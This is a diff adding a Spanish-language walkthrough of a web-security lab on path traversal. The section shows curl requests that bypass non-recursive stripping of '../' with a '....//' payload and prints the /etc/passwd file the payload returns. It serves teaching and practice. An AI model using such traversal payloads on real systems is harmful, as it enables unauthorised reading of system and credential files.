@@ -109,3 +109,38 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 
 ## 3. Lab: File path traversal, traversal sequences stripped non-recursively
 
+Vamos mas al grano, y vamos a probar de una vez el enlace de las imagenes con el fichero **/etc/passwd**.
+
+```bash
+https://ace61faf1e31e3fe80d5108c00bf0069.web-security-academy.net/image?filename=71.jpg
+```
+
+```bash
+└──╼ $curl https://ace61faf1e31e3fe80d5108c00bf0069.web-security-academy.net/image?filename=/etc/passwd
+"No such file"
+
+└──╼ $curl https://ace61faf1e31e3fe80d5108c00bf0069.web-security-academy.net/image?filename=../../etc/passwd
+"No such file"
+```
+
+Podemos sospechar lo mismo que en el nivel anterior, la consulta elimina la cadena **../** por lo cual, lo que haremos será burlar esto de una manera algo ingeniosa:
+
+```bash
+#El sitio eliminará la cadena ../ pero, al hacer eso juntará las cadenas .. y / que crearán otro ../
+...// -> ..(../)/ -> ../
+```
+
+Entonces ahora pogramos el payload con el comando **curl**.
+
+```bash
+└──╼ $curl "https://ace61faf1e31e3fe80d5108c00bf0069.web-security-academy.net/image?filename=....//....//....//etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+```
+
+## 4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+
